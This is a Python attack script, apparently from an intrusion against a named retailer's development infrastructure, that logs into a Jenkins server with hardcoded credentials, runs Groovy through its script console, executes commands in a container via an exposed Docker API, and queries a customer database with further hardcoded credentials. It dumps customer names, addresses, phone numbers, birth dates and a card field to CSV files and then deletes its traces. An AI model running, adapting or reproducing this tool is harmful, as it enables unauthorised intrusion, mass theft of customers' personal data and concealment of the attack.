import requests
import json
import urllib3
import os
import sys
import csv
import io
import time

sys.stdout.reconfigure(encoding='utf-8')
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

OUTPUT_DIR = r"c:\xampp\htdocs\pentagi\claroshop_attack\dev_sears_clientes"
CONSOLIDATED_FULL = r"c:\xampp\htdocs\pentagi\claroshop_attack\dev_sears_clientes_full.csv"

os.makedirs(OUTPUT_DIR, exist_ok=True)

sess = requests.Session()
sess.auth = (USER, PASS)
sess.verify = False

def get_crumb():
    r = sess.get(f"{JENKINS}/crumbIssuer/api/json", timeout=30)
    r.raise_for_status()
    d = r.json()
    return {d["crumbRequestField"]: d["crumb"]}

def jenkins_groovy(groovy_code):
    headers = get_crumb()
    r = sess.post(f"{JENKINS}/scriptText", data={"script": groovy_code}, headers=headers, timeout=180)
    return r.text

def run_php_query(php_script_content):
    groovy = f'''
import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def cid = "5b32e909c295"

def dockerExec(String containerId, List cmd) {{
    def dockerHost = "172.27.140.148"
    def dockerPort = 4243
    def url = new URL("http://${{dockerHost}}:${{dockerPort}}/containers/${{containerId}}/exec")
    def conn = url.openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setRequestProperty("Content-Type", "application/json")
    conn.setConnectTimeout(5000)
    conn.setReadTimeout(120000)
    def body = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: cmd])
    conn.outputStream.write(body.bytes)
    conn.outputStream.flush()
    def execResp = conn.inputStream.text
    def execData = new JsonSlurper().parseText(execResp)
    def execId = execData.Id

    def startUrl = new URL("http://${{dockerHost}}:${{dockerPort}}/exec/${{execId}}/start")
    def startConn = startUrl.openConnection()
    startConn.setRequestMethod("POST")
    startConn.setDoOutput(true)
    startConn.setRequestProperty("Content-Type", "application/json")
    startConn.setConnectTimeout(5000)
    startConn.setReadTimeout(120000)
    startConn.outputStream.write('{{"Detach":false,"Tty":false}}'.bytes)
    startConn.outputStream.flush()
    
    def is = startConn.inputStream
    def baos = new ByteArrayOutputStream()
    def buf = new byte[65536]
    int n
    while ((n = is.read(buf)) != -1) {{
        baos.write(buf, 0, n)
    }}
    def raw = baos.toByteArray()
    
    // Demux docker stream
    def output = new StringBuilder()
    int pos = 0
    while (pos + 8 <= raw.length) {{
        int frameLen = ((raw[pos+4] & 0xFF) << 24) | ((raw[pos+5] & 0xFF) << 16) | ((raw[pos+6] & 0xFF) << 8) | (raw[pos+7] & 0xFF)
        pos += 8
        if (pos + frameLen <= raw.length) {{
            output.append(new String(raw, pos, frameLen, "UTF-8"))
        }}
        pos += frameLen
    }}
    if (output.length() == 0 && raw.length > 0) {{
        return new String(raw, "UTF-8")
    }}
    return output.toString()
}}

def b64Script = "{php_script_content.encode('utf-8').hex()}"
def writeCmd = ["bash", "-c", "python -c \\"import binascii; open('/tmp/query.php','wb').write(binascii.unhexlify('${{b64Script}}'))\\""]
dockerExec(cid, writeCmd)

def runCmd = ["php", "/tmp/query.php"]
println dockerExec(cid, runCmd)
'''
    return jenkins_groovy(groovy)

def fix_double_utf8(val):
    if not val or not isinstance(val, str):
        return val
    try:
        if 'Ã' in val or 'Â' in val or 'â' in val:
            return val.encode('latin1').decode('utf-8')
    except Exception:
        pass
    return val

def fetch_sql_to_csv(sql):
    php = f"""<?php
$host = '172.27.141.6';
$port = 3308;
$user = 'apifincadodev';
$pass = '1q2w3e4r5t6y';
$db   = 'tienda';

$m = new mysqli($host, $user, $pass, $db, $port);
if ($m->connect_error) {{
    die("CONNECT_ERROR: " . $m->connect_error);
}}
$m->set_charset("latin1");

$sql = "{sql}";
$res = $m->query($sql);
if (!$res) {{
    die("QUERY_ERROR: " . $m->error);
}}

$out = fopen('php://output', 'w');
$fields = [];
foreach ($res->fetch_fields() as $f) {{
    $fields[] = $f->name;
}}
fputcsv($out, $fields);

while ($row = $res->fetch_assoc()) {{
    $clean_row = [];
    foreach ($row as $k => $v) {{
        if ($v === null) {{
            $clean_row[] = '';
        }} else {{
            $clean_row[] = mb_convert_encoding($v, 'UTF-8', 'ISO-8859-1');
        }}
    }}
    fputcsv($out, $clean_row);
}}
fclose($out);
$m->close();
?>"""
    return run_php_query(php)

def parse_csv_string(csv_text):
    f = io.StringIO(csv_text.strip())
    reader = csv.reader(f)
    rows = list(reader)
    if not rows:
        return [], []
    header = rows[0]
    raw_data = rows[1:]
    clean_data = []
    for row in raw_data:
        clean_row = [fix_double_utf8(cell) for cell in row]
        clean_data.append(clean_row)
    return header, clean_data

def main():
    print("=" * 70)
    print("ALIENSITO / TR4NSHACK — SEARS DEV CLIENTS EXFILTRATION")
    print("=" * 70)

    # 1. Counts check
    count_sql = "SELECT (SELECT COUNT(*) FROM tienda.clientes) as clientes_count, (SELECT COUNT(*) FROM tienda.datos_clientes) as datos_count"
    _, count_rows = parse_csv_string(fetch_sql_to_csv(count_sql))
    total_clientes = int(count_rows[0][0])
    total_datos = int(count_rows[0][1])
    print(f"[+] Total en tienda.clientes: {total_clientes}")
    print(f"[+] Total en tienda.datos_clientes: {total_datos}")

    # 2. Exfiltrate JOINED clients + datos_clientes in batches of 1000
    batch_size = 1000
    num_batches = (total_clientes + batch_size - 1) // batch_size
    print(f"[+] Exfiltrando JOIN clientes + datos_clientes en {num_batches} batches de {batch_size}...")

    joined_header = None
    all_joined_rows = []

    for b in range(num_batches):
        offset = b * batch_size
        batch_num_str = f"{b+1:04d}"
        batch_filename = os.path.join(OUTPUT_DIR, f"batch_{batch_num_str}.csv")
        
        sql = f"""SELECT c.*, 
            d.Direccion, d.Entre_Calles, d.Colonia, d.Ciudad, d.Estado, d.Codigo_Postal, d.Pais, 
            d.Lada, d.Telefono1, d.Celular, d.Fecha_Inicio as datos_Fecha_Inicio, 
            d.Fecha_Nacimiento as datos_Fecha_Nacimiento, d.Tarjeta, d.num_ext, d.num_int, 
            d.es_telmex, d.es_telcel, d.municipio, d.municipio_id
            FROM tienda.clientes c
            LEFT JOIN tienda.datos_clientes d ON c.Id = d.Cliente
            ORDER BY c.Id ASC
            LIMIT {batch_size} OFFSET {offset}"""
        
        print(f"    [*] Batch {b+1}/{num_batches} (OFFSET {offset}, LIMIT {batch_size})...")
        t0 = time.time()
        csv_resp = fetch_sql_to_csv(sql)
        elapsed = time.time() - t0
        
        header, rows = parse_csv_string(csv_resp)
        print(f"    [+] Batch {b+1} recibido: {len(rows)} filas en {elapsed:.2f}s")
        
        # Save batch file
        with open(batch_filename, "w", newline="", encoding="utf-8-sig") as bf:
            writer = csv.writer(bf)
            writer.writerow(header)
            writer.writerows(rows)
        print(f"    [+] Guardado en {batch_filename}")

        if joined_header is None:
            joined_header = header
        all_joined_rows.extend(rows)

    # 3. Exfiltrate raw tienda.clientes table
    print(f"\n[+] Exfiltrando tabla individual tienda.clientes...")
    clientes_header = None
    all_clientes_rows = []
    for b in range(num_batches):
        offset = b * batch_size
        batch_num_str = f"{b+1:04d}"
        batch_filename = os.path.join(OUTPUT_DIR, f"batch_clientes_{batch_num_str}.csv")
        sql = f"SELECT * FROM tienda.clientes ORDER BY Id ASC LIMIT {batch_size} OFFSET {offset}"
        csv_resp = fetch_sql_to_csv(sql)
        header, rows = parse_csv_string(csv_resp)
        with open(batch_filename, "w", newline="", encoding="utf-8-sig") as bf:
            writer = csv.writer(bf)
            writer.writerow(header)
            writer.writerows(rows)
        if clientes_header is None:
            clientes_header = header
        all_clientes_rows.extend(rows)

    # 4. Exfiltrate raw tienda.datos_clientes table
    num_datos_batches = (total_datos + batch_size - 1) // batch_size
    print(f"[+] Exfiltrando tabla individual tienda.datos_clientes en {num_datos_batches} batches...")
    datos_header = None
    all_datos_rows = []
    for b in range(num_datos_batches):
        offset = b * batch_size
        batch_num_str = f"{b+1:04d}"
        batch_filename = os.path.join(OUTPUT_DIR, f"batch_datos_clientes_{batch_num_str}.csv")
        sql = f"SELECT * FROM tienda.datos_clientes ORDER BY Cliente ASC LIMIT {batch_size} OFFSET {offset}"
        csv_resp = fetch_sql_to_csv(sql)
        header, rows = parse_csv_string(csv_resp)
        with open(batch_filename, "w", newline="", encoding="utf-8-sig") as bf:
            writer = csv.writer(bf)
            writer.writerow(header)
            writer.writerows(rows)
        if datos_header is None:
            datos_header = header
        all_datos_rows.extend(rows)

    # 5. Consolidate full joined file
    print(f"\n[+] Consolidando archivo completo: {CONSOLIDATED_FULL}...")
    with open(CONSOLIDATED_FULL, "w", newline="", encoding="utf-8-sig") as cf:
        writer = csv.writer(cf)
        writer.writerow(joined_header)
        writer.writerows(all_joined_rows)

    print(f"[+] Total consolidado escrito: {len(all_joined_rows)} registros")

    # Clean up /tmp/query.php in container
    run_php_query("<?php @unlink('/tmp/query.php'); echo 'CLEANUP_OK'; ?>")

    print("\n" + "=" * 70)
    print("RESUMEN FINAL DE EXTRACCIÓN:")
    print("=" * 70)
    print(f"Total clientes únicos extraídos: {len(all_joined_rows)}")
    print(f"Total datos_clientes extraídos: {len(all_datos_rows)}")
    print(f"Batches generados en {OUTPUT_DIR}:")
    for f in sorted(os.listdir(OUTPUT_DIR)):
        fp = os.path.join(OUTPUT_DIR, f)
        print(f"  - {f} ({os.path.getsize(fp):,} bytes)")
    print(f"Archivo consolidado: {CONSOLIDATED_FULL} ({os.path.getsize(CONSOLIDATED_FULL):,} bytes)")

if __name__ == '__main__':
    main()
